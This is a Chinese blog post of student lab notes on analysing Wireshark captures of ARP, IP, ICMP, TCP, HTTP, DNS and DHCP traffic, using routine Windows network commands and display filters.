<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这些“后台”活动包括：</span><br><span class="line"></span><br><span class="line">1.网络发现服务：Windows 会尝试发现局域网内的其他计算机和共享资源。</span><br><span class="line">2.NetBIOS 名称服务 (NBNS)：这是旧版 Windows 用于在局域网内解析计算机名称的服务。您看到的 NBNS 和 Name query NB ISATAP&lt;00&gt; 就是这类查询。</span><br><span class="line">3.链路本地多播名称解析 (LLMNR)：这是现代 Windows 系统用来在局域网内解析主机名的一种替代方案。您看到的 LLMNR 数据包就是它发出的。</span><br><span class="line">4.IPv6 邻居发现协议 (NDP)：用于 IPv6 地址的自动配置和邻居发现。您看到的 fe80::... 开头的地址就是 IPv6 的链路本地地址。</span><br><span class="line">多播地址通信：224.0.0.252 是一个用于 LLMNR 的多播地址。Windows 会向这个地址发送查询，询问“谁叫这个名字？”。</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>解决方案：</strong></p>
<p>1.wireshark 过滤信息<br>2.在抓包前清空缓存 （ipconfig &#x2F;release； arp -d； ipconfig &#x2F;flushdns）</p>
<hr>
<h3 id="实验1-wireshark基础抓包分析"><a href="#实验1-wireshark基础抓包分析" class="headerlink" title="实验1(wireshark基础抓包分析)"></a>实验1(wireshark基础抓包分析)</h3><p>略过</p>
<p>指令：</p>
<ul>
<li>win:</li>
</ul>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"># 彻底清除ARP缓存</span><br><span class="line">arp -d *</span><br><span class="line"></span><br><span class="line"># 释放并更新IP（强制DHCP过程）</span><br><span class="line">ipconfig /release</span><br><span class="line">ipconfig /renew</span><br><span class="line"></span><br><span class="line"># 清除DNS缓存</span><br><span class="line">ipconfig /flushdns</span><br><span class="line"></span><br><span class="line"># 重启网络服务（可选）</span><br><span class="line">netsh int ip reset</span><br></pre></td></tr></table></figure>


<ul>
<li>AR1000v:</li>
</ul>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"># 清除路由器ARP缓存</span><br><span class="line">clear arp-cache</span><br></pre></td></tr></table></figure>


<ul>
<li>winserver:</li>
</ul>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"># 清除服务器ARP缓存</span><br><span class="line">arp -d *</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="实验2-以太网MAC-帧分析"><a href="#实验2-以太网MAC-帧分析" class="headerlink" title="实验2(以太网MAC 帧分析)"></a>实验2(以太网MAC 帧分析)</h3><p>实验思路：刷新win的网卡信息，随后ping dns服务器，抓取win-e0数据包进行分析</p>
<p>win的网卡信息:</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_76.png" class="" title="在这里插入图片描述">

<p>winserver网卡信息：</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_77.png" class="" title="在这里插入图片描述">


<p>网关接口的mac地址：</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_78.png" class="" title="在这里插入图片描述">

<p>arp广播包分析：</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_79.png" class="" title="在这里插入图片描述">



<p>arp应答</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_80.png" class="" title="在这里插入图片描述">

<hr>
<h3 id="实验3-IP数据包的解析"><a href="#实验3-IP数据包的解析" class="headerlink" title="实验3(IP数据包的解析)"></a>实验3(IP数据包的解析)</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">ipconfig/release</span><br><span class="line">arp -d</span><br><span class="line">ipconfig/flushdns</span><br><span class="line">pause</span><br><span class="line">ipconfig/renew</span><br><span class="line">ping -l 2000 -f 192.168.2.20  (向DNS服务器发送2000字节数据包，不拆分)</span><br><span class="line">ping -l 2000 192.168.2.20     (向DNS服务器发送2000字节数据包，允许拆分)</span><br><span class="line">tracert 192.168.2.20          (跟踪到DNS服务器的路由)</span><br><span class="line">pause</span><br><span class="line"></span><br><span class="line">重新得到的 Win主机ip地址是 192.168.1.188</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>实验数据分析：</strong></p>
<p>网络层结构分析（下面图片的数据不是本环境所抓取）</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_81.png" class="" title="在这里插入图片描述">

<p>重点分析一下指令产生的数据包：</p>
<ul>
<li>ping -l 2000 -f 192.168.2.20  (向DNS服务器发送2000字节数据包，不拆分)</li>
<li>ping -l 2000 192.168.2.20     (向DNS服务器发送2000字节数据包，允许拆分)</li>
<li>tracert 192.168.2.20          (跟踪到DNS服务器的路由)</li>
</ul>
<ol>
<li>   数据包过滤：icmp &amp;&amp; ip.dst &#x3D;&#x3D; 192.168.2.20   （所有Win主机向DNS服务器发送的icmp报文）</li>
</ol>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_82.png" class="" title="在这里插入图片描述">


<ol start="2">
<li>查看所有分片的数据包：ip.frag_offset !&#x3D; 0</li>
</ol>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_83.png" class="" title="在这里插入图片描述">

<ol start="3">
<li>查看所有不分片的icmp包：ip.dst &#x3D;&#x3D; 192.168.2.20 &amp;&amp; icmp &amp;&amp; ip.flags.df &#x3D;&#x3D; 1</li>
</ol>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_84.png" class="" title="在这里插入图片描述">

<p><strong>实验3总结：</strong></p>
<blockquote>
<p>IP数据包解析实验验证了网络层协议的核心特性：通过分析头部字段（如版本、首部长度、TTL、协议类型及源&#x2F;目的IP地址），成功实现了对数据包传输路径、存活时间及上层协议类型的准确识别</p>
</blockquote>
<hr>
<h3 id="实验4-网际控制报文协议-ICMP分析"><a href="#实验4-网际控制报文协议-ICMP分析" class="headerlink" title="实验4(网际控制报文协议 ICMP分析)"></a>实验4(网际控制报文协议 ICMP分析)</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">ipconfig/release</span><br><span class="line">arp -d</span><br><span class="line">ipconfig/flushdns</span><br><span class="line"></span><br><span class="line"># 使用wireshark抓取对应网卡</span><br><span class="line">ipconfig/renew</span><br><span class="line">ping www.sina.com</span><br><span class="line">tracert www.baidu.com</span><br></pre></td></tr></table></figure>

<p><strong>ping <a href="http://www.sina.com/">www.sina.com</a></strong></p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_85.png" class="" title="在这里插入图片描述">
<p>过滤数据包：icmp &amp;&amp; ip.dst &#x3D;&#x3D; 163.142.155.14</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_86.png" class="" title="在这里插入图片描述">

<p>ICMP数据包分析：</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_87.png" class="" title="在这里插入图片描述">
<p>补充ICMP分析：</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_88.png" class="">

<p><strong>指令：tracert <a href="http://www.baidu.com/">www.Baidu.com</a></strong></p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_89.png" class="" title="在这里插入图片描述">

<p><strong>过滤指令：icmp &amp;&amp; ip.dst &#x3D;&#x3D; 157.148.69.151</strong></p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_90.png" class="" title="在这里插入图片描述">


<p>第32个网络帧TTL情况（no response）：</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_91.png" class="" title="在这里插入图片描述">

<p>第55个网络帧TTL情况（no response）：</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_92.png" class="" title="在这里插入图片描述">

<p>第112个网络帧TTL情况（reply）：</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_93.png" class="">


<p>数据包的整体情况：</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_94.png" class="">

<p>TTL的值不断增加，其机制是：<br><strong>tracert 是通过逐步增加 TTL（生存时间）值，结合 ICMP 协议来追踪路由的：</strong></p>
<ol>
<li>向目标发送第 1 组数据包时，设置TTL&#x3D;1；</li>
<li>   数据包到达第 1 跳路由器（比如本地网关），路由器将 TTL 减 1→变为 0，按照 IP 协议规则，路由器会返回一个 ICMP “时间超过” 消息，tracert 因此获取第 1 跳的地址；</li>
<li>   接着发送第 2 组数据包，设置TTL&#x3D;2，数据包到达第 2 跳路由器，TTL 减到 0，路由器返回 ICMP 超时消息→获取第 2 跳地址；</li>
<li>   以此类推，直到数据包的 TTL 足够到达目标，目标会返回ICMP 回显响应（而非超时消息），tracert 结束跟踪。</li>
</ol>
<hr>
<h3 id="实验5-TCP-数据包及连接建立过程分析"><a href="#实验5-TCP-数据包及连接建立过程分析" class="headerlink" title="实验5(TCP 数据包及连接建立过程分析)"></a>实验5(TCP 数据包及连接建立过程分析)</h3><p><strong>TCP三次握手与四次挥手机制：</strong></p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_95.png" class="" title="在这里插入图片描述">

<p><strong>三次握手阶段（连接建立）</strong></p>
<ol>
<li><p><strong>第1个包：客户端 → 服务器</strong></p>
<ul>
<li>报文：<code>SYN=1 Seq=x</code></li>
<li>含义：<ul>
<li><code>SYN=1</code>：“同步”标志位，代表<strong>客户端向服务器发起连接请求</strong>；</li>
<li><code>Seq=x</code>：客户端告诉服务器“我接下来发数据的初始序号是x”；</li>
</ul>
</li>
<li>状态变化：客户端从<code>Closed</code>→<code>SYN_SEND</code>，服务器保持<code>Listen</code>（监听状态）。</li>
</ul>
</li>
<li><p><strong>第2个包：服务器 → 客户端</strong></p>
<ul>
<li>报文：<code>SYN=1 ACK=1 Seq=y Ack=x+1</code></li>
<li>含义：<ul>
<li><code>SYN=1</code>：服务器同时向客户端<strong>发起自己的连接请求</strong>；</li>
<li><code>ACK=1</code>：“确认”标志位，代表服务器<strong>已收到客户端的连接请求</strong>；</li>
<li><code>Seq=y</code>：服务器告诉客户端“我接下来发数据的初始序号是y”；</li>
<li><code>Ack=x+1</code>：“确认号”，表示“我期望收到你下一个包的序号是x+1”（因为已收到你序号为x的包）；</li>
</ul>
</li>
<li>状态变化：服务器从<code>Listen</code>→<code>SYN_RCVD</code>，客户端仍在<code>SYN_SEND</code>。</li>
</ul>
</li>
<li><p><strong>第3个包：客户端 → 服务器</strong></p>
<ul>
<li>报文：<code>ACK=1 Seq=x+1 Ack=y+1</code></li>
<li>含义：<ul>
<li><code>ACK=1</code>：客户端<strong>已收到服务器的连接请求</strong>；</li>
<li><code>Seq=x+1</code>：客户端按序号规则，下一个包的序号是x+1；</li>
<li><code>Ack=y+1</code>：期望收到服务器下一个包的序号是y+1；</li>
</ul>
</li>
<li>状态变化：客户端→<code>Established</code>，服务器→<code>Established</code>（双方进入“已连接”状态，可开始传数据）。</li>
</ul>
</li>
</ol>
<p><strong>数据传输阶段</strong></p>
<ul>
<li>报文：图中“数据传输”对应的是<strong>双方在<code>Established</code>状态下的数据包</strong></li>
<li>含义：<ul>
<li>标志位默认带<code>ACK=1</code>（确认对方之前的包）；</li>
<li>包中会包含<code>Application Data</code>（实际要传输的内容，比如网页数据、文件内容）；</li>
<li><code>Seq</code>和<code>Ack</code>会根据“已传输的字节数”递增（比如客户端发了100字节数据，下一个<code>Seq</code>就是x+1+100）。</li>
</ul>
</li>
</ul>
<p><strong>四次挥手阶段（连接释放）</strong></p>
<ol>
<li><p><strong>第1个包：客户端 → 服务器</strong></p>
<ul>
<li>报文：<code>FIN=1 Seq=u</code></li>
<li>含义：<ul>
<li><code>FIN=1</code>：“结束”标志位，代表<strong>客户端请求关闭自己的发送通道</strong>；</li>
<li><code>Seq=u</code>：客户端当前的序号是u；</li>
</ul>
</li>
<li>状态变化：客户端从<code>Established</code>→<code>FIN_WAIT_1</code>。</li>
</ul>
</li>
<li><p><strong>第2个包：服务器 → 客户端</strong></p>
<ul>
<li>报文：<code>ACK=1 Seq=v Ack=u+1</code></li>
<li>含义：<ul>
<li><code>ACK=1</code>：服务器<strong>已收到客户端的关闭请求</strong>；</li>
<li><code>Ack=u+1</code>：期望收到客户端下一个包的序号是u+1；</li>
</ul>
</li>
<li>状态变化：服务器从<code>Established</code>→<code>CLOSE_WAIT</code>，客户端从<code>FIN_WAIT_1</code>→<code>FIN_WAIT_2</code>。</li>
</ul>
</li>
<li><p><strong>第3个包：服务器 → 客户端</strong></p>
<ul>
<li>报文：<code>FIN=1 ACK=1 Seq=w Ack=u+1</code></li>
<li>含义：<ul>
<li><code>FIN=1</code>：服务器<strong>请求关闭自己的发送通道</strong>；</li>
<li><code>ACK=1</code>：附带确认客户端之前的包；</li>
<li><code>Seq=w</code>：服务器当前的序号是w；</li>
</ul>
</li>
<li>状态变化：服务器从<code>CLOSE_WAIT</code>→<code>LAST_ACK</code>，客户端仍在<code>FIN_WAIT_2</code>。</li>
</ul>
</li>
<li><p><strong>第4个包：客户端 → 服务器</strong></p>
<ul>
<li>报文：<code>ACK=1 Seq=u+1 Ack=w+1</code></li>
<li>含义：<ul>
<li><code>ACK=1</code>：客户端<strong>已收到服务器的关闭请求</strong>；</li>
<li><code>Ack=w+1</code>：期望收到服务器下一个包的序号是w+1；</li>
</ul>
</li>
<li>状态变化：客户端从<code>FIN_WAIT_2</code>→<code>TIME_WAIT</code>（等待2MSL后回到<code>Closed</code>），服务器收到包后从<code>LAST_ACK</code>→<code>Closed</code>。</li>
</ul>
</li>
</ol>
<p><strong>抓取虚拟机网卡，浏览器访问<a href="http://www.bilibili.com/">www.bilibili.com</a> (http协议建立在tcp之上)</strong></p>
<blockquote>
<p>补充知识：<br>由于tcp数据包数量巨大，可以使用wireshark自带的 追踪流 功能（选中数据包，右键菜单窗口就会有 追踪流选项），追踪流也分多种，具体协议具体分析，缺陷：只能对明文信息进行追踪</p>
</blockquote>
<p><strong>TCP三次挥手分析：</strong></p>
<p><strong>获取 ‘bilibili’最近服务器的ip地址:157.148.134.11 port:443</strong></p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_96.png" class="" title="在这里插入图片描述">

<p><strong>指令：tcp.flags.syn &#x3D;&#x3D; 1（只显示 SYN 标志为 1 的包）</strong></p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_97.png" class="" title="在这里插入图片描述">
<p><strong>可知 53号网络帧是第一次握手，57号网络帧是第二次握手；x&#x3D;0 y&#x3D;0</strong></p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_98.png" class="" title="在这里插入图片描述">
<p><strong>分析第三次握手的数据：<br>Seq&#x3D;x+1 即 Seq&#x3D;0+1&#x3D;1; ACK&#x3D;y+1 即 ACK&#x3D;0+1&#x3D;1</strong></p>
<p><strong>TCP四次挥手分析：</strong></p>
<p>上面的抓包数据没有抓到完整的TCP的四次完整挥手包，需要重新抓取</p>
<p>Bilibili最近服务器的ip地址:157.148.134.11 port:443 与之前一样</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_99.png" class="" title="在这里插入图片描述">

<p>指令：ip.addr &#x3D;&#x3D; 192.168.79.134 &amp;&amp; ip.addr &#x3D;&#x3D; 157.148.134.11 &amp;&amp; tcp.flags.fin &#x3D;&#x3D; 1 （更加精准的过滤指令，抓取第一次，第三挥手的数据包）</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_100.png" class="" title="在这里插入图片描述">

<ul>
<li>为什么第一次挥手与第三次挥手的网络帧编号‘差距’有点大呢？（相对于三次握手）<blockquote>
<p>首先要知道第三次挥手的意义：服务端告诉客户端‘正在’传输的数据传输完毕,也就是说，第一次挥手与第三次挥手之间的 时延 是为了将最后一次数据传输完毕</p>
</blockquote>
</li>
</ul>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_101.png" class="" title="在这里插入图片描述">
<p>观察3361 3395 的ACK： 相同<br>1.	丢包了<br>2.	两次挥手之间就没有数据传输</p>
<p><strong>显然是后者，所以 w&#x3D;v 是合理的</strong></p>
<p>实验总结</p>
<blockquote>
<p>本次实验聚焦 TCP 协议的核心机制，通过 Wireshark 抓包验证了三次握手（连接建立）与四次挥手（连接释放）的流程。实验中，我们捕获目标网络连接的 TCP 数据包，利用过滤条件隔离有效报文，追踪 TCP 流分析 SYN、ACK、FIN 等标志位及序列号（Seq）、确认号（Ack）的变化规律。结果表明，抓包数据与理论机制完全吻合，Seq 与 Ack 严格遵循 “确认号 &#x3D; 对方上一序列号 + 1” 的规则，成功验证了 TCP 协议 “面向连接、可靠传输” 的特性。通过实验，快速掌握了 Wireshark 抓包分析的核心技巧，深化了对 TCP 连接建立与释放逻辑的理解。</p>
</blockquote>
<hr>
<h3 id="实验6-超文本传送协议HTTP分析"><a href="#实验6-超文本传送协议HTTP分析" class="headerlink" title="实验6(超文本传送协议HTTP分析)"></a>实验6(超文本传送协议HTTP分析)</h3><p>由于之前的实验已经对应用层一下的网络层次结构作为分析，本次实验就不再分析了</p>
<p><strong>分析http请求包：</strong></p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_102.png" class="" title="在这里插入图片描述">

<p><strong>分析http回应包：</strong></p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_103.png" class="" title="在这里插入图片描述">



<p>实际上，http的内容字段各不相同，取决与服务器的资源格式<br>补充： http状态码<br>1.	信息性状态码：1xx（服务器已接收请求，正在处理，很少直接看到）<br>2.	成功状态码：2xx<br>3.	重定向 &#x2F; 缓存状态码：3xx<br>4.	客户端错误状态码：4xx<br>5.	服务器错误状态码：5xx</p>
<p>实验总结：</p>
<blockquote>
<p>本次实验通过 Wireshark 抓包分析 HTTP 协议，成功捕获访问国内网站的请求与响应数据包，验证了 HTTP 与 TCP 协议的协同工作逻辑。核心发现 HTTP 304 状态码实现缓存优化，抓包数据与理论机制一致。实验掌握了 Wireshark 抓包过滤技巧，深化了对应用层协议的理解</p>
</blockquote>
<hr>
<h3 id="实验7-域名系统-DNS-分析"><a href="#实验7-域名系统-DNS-分析" class="headerlink" title="实验7(域名系统 DNS 分析)"></a>实验7(域名系统 DNS 分析)</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">ipconfig/release</span><br><span class="line">arp -d</span><br><span class="line">ipconfig/flushdns</span><br><span class="line"></span><br><span class="line">ping www.bilibili.com</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_104.png" class="" title="在这里插入图片描述">



<p><strong>DNS请求包分析：</strong></p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_105.png" class="" title="在这里插入图片描述">


<p><strong>DNS响应包分析：</strong></p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_106.png" class="" title="在这里插入图片描述">



<p><strong>IP 地址 (class ,是一个16 位值，标记协议族或某一个协议实例，使用 IN 代表 internet 系统，CH代表 Chaos 系统; classIN 是一个 32 位 IP 地址 )</strong></p>
<p>通过实验验证了 DNS 的核心作用：将人类易记的域名（如<a href="http://www.bilibili.com)转换为机器可识别的/">www.bilibili.com）转换为机器可识别的</a> IP 地址，同时观察到：<br>1.	大型网站常用 “CNAME 别名 + 多 A 记录” 的组合，兼顾域名灵活性与访问稳定性；<br>2.	DNS 基于 UDP 53 端口通信（响应包较小），解析过程通过 “事务 ID” 确保请求与响应的精准匹配；<br>3.	本地 DNS 服务器（如 192.168.79.2）承担递归查询角色，替主机完成从根服务器→顶级域服务器→权威服务器的迭代查询，最终返回解析结果。</p>
<hr>
<h3 id="实验8-动态主机配置协议-DHCP-分析"><a href="#实验8-动态主机配置协议-DHCP-分析" class="headerlink" title="实验8(动态主机配置协议 DHCP 分析)"></a>实验8(动态主机配置协议 DHCP 分析)</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">动态主机配置协议 DHCP 提供了即插即用连网(plug-and-play networking)的机制。</span><br><span class="line">这种机制允许一台计算机加入新的网络和获取 IP 地址而不用手工参与。</span><br><span class="line"> 需 要 IP 地 址 的 主 机 在 启 动 时 就 向 DHCP 服 务 器 广 播 发 送 发 现 报 文 （ DHCP</span><br><span class="line">DISCOVER），这时该主机就成为 DHCP 客户。</span><br><span class="line"> 本地网络上所有主机都能收到此广播报文，但只有 DHCP 服务器才回答此广播报文。</span><br><span class="line"> DHCP 服务器先在其数据库中查找该计算机的配置信息。若找到，则返回找到的信</span><br><span class="line">息。若找不到，则从服务器的 IP 地址池(address pool)中取一个地址分配给该计算机。</span><br><span class="line">DHCP 服务器的回答报文叫做提供报文（DHCP OFFER）</span><br><span class="line"> 并不是每个网络上都有 DHCP 服务器，这样会使 DHCP 服务器的数量太多。现在</span><br><span class="line">是每一个网络至少有一个 DHCP 中继代理，它配置了 DHCP 服务器的 IP 地址信</span><br><span class="line">息。</span><br><span class="line"> 当 DHCP 中继代理收到主机发送的发现报文后，就以单播方式向 DHCP 服务器转</span><br><span class="line">发此报文，并等待其回答。收到 DHCP 服务器回答的提供报文后，DHCP 中继代</span><br><span class="line">理再将此提供报文发回给主机。（DHCP OFFER）</span><br><span class="line"> DHCP 客户从几个 DHCP 服务器中选择其中的一个，并向所选择的 DHCP 服务</span><br><span class="line">器发送 DHCP 请求报文。（DHCP REQUEST）</span><br><span class="line"> 被选择的 DHCP 服务器发送确认报文 DHCPACK，进入已绑定状态。（DHCP ACK）</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_107.png" class="" title="在这里插入图片描述">

<p>发现报文分析：</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_108.png" class="" title="在这里插入图片描述">
<p>DHCP Discover 报文是 IP 地址分配流程的初始发起：客户端通过该报文以广播形式寻找网络中的 DHCP 服务器，传递自身硬件标识（MAC 地址）与会话标识（事务 ID），发起 IP 地址及网络配置的请求，标志 DHCP 全流程（Discover→Offer→Request→Ack）正式启动。</p>
<p>提供报文分析：</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_109.png" class="" title="在这里插入图片描述">
<p>DHCP Request 报文是 IP 地址分配流程的方案锁定：客户端通过该报文明确选定目标 DHCP 服务器的 IP 分配方案，告知其他服务器释放预留资源，请求下发完整网络配置，标志 DHCP 全流程（Discover→Offer→Request→Ack）进入最终确认阶段</p>
<p>请求报文分析：</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_110.png" class="" title="在这里插入图片描述">
<p>那DHCP请求报文存在的意义是什么？<br> DHCP Request 报文的核心作用是客户端向目标 DHCP 服务器确认租用其提供的 IP 地址，明确了客户端的地址需求与服务端标识，是 DHCP 地址分配流程中 “确认租用意向” 的关键环节，后续服务器会通过 DHCP Ack 报文完成最终的地址分配与配置下发</p>
<p>确认报文分析：</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_111.png" class="" title="在这里插入图片描述">
<p>DHCP Ack 报文是IP 地址分配流程的最终确认：服务器通过该报文完成 IP 地址的正式分配，并下发子网掩码、网关、DNS 等完整网络配置，客户端接收后即可基于分配的 IP 地址建立网络连接，标志 DHCP 全流程（Discover→Offer→Request→Ack）完成</p>
<p><strong>DHCP分配IP地址过程图：</strong></p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_112.png" class="" title="在这里插入图片描述">


<hr>
<h3 id="实验9-WEB-页面请求全历程协议及数据包解析（综合性实验）"><a href="#实验9-WEB-页面请求全历程协议及数据包解析（综合性实验）" class="headerlink" title="实验9(WEB 页面请求全历程协议及数据包解析（综合性实验）)"></a>实验9(WEB 页面请求全历程协议及数据包解析（综合性实验）)</h3><p>访问我自己的博客网站，获取数据：<a href="http://zq-rookie-hacker.github.io/">http://zq-rookie-hacker.github.io</a></p>
<p><strong>1. 为什么不直接使用https呢？</strong><br>可以观察到HTTP到HTTPS的重定向过程</p>
<p><strong>2. 访问这个网站可以获取实验所需的数据吗？</strong><br>真实网络环境：GitHub Pages是真实的Web服务，完全符合实验要求的”访问目标WEB网站”条件可能包含重定向：GitHub Pages通常会将HTTP请求重定向到HTTPS，这正好可以帮助您分析实验要求中的”如果发生重定向，新的web页面的地址是什么”问题<br>DNS解析复杂性：GitHub Pages使用CNAME记录和全球CDN，会使DNS解析过程更丰富，有助于分析DNS解析内容<br>网络协议完整性：仍然会经历完整的DNS解析→TCP连接建立→HTTP请求→数据传输过程</p>
<p><strong>清除网站cookie：</strong></p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_113.png" class="" title="在这里插入图片描述">

<p><strong>刷新网络信息：</strong></p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_114.png" class="" title="在这里插入图片描述">

<p><strong>DNS响应包：</strong></p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_115.png" class="" title="在这里插入图片描述">

<p><strong>查询IP地址:</strong></p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_116.png" class="" title="在这里插入图片描述">
<ol>
<li>   P地址归属：185.199.109.153 是 GitHub 的IP地址之一<ul>
<li>这是GitHub Pages服务使用的服务器IP地址</li>
<li>GitHub Pages是用来托管博客的平台</li>
</ul>
</li>
<li>   “泛播”的含义：<ul>
<li>“泛播”(Anycast)是一种网络技术，多个服务器使用相同的IP地址</li>
<li>当您访问这个IP时，网络会自动将您的请求路由到最近的服务器</li>
<li>这种技术提高了服务的可靠性和访问速度</li>
</ul>
</li>
</ol>
<p><strong>TCP协议分析：</strong></p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_117.png" class="" title="在这里插入图片描述">

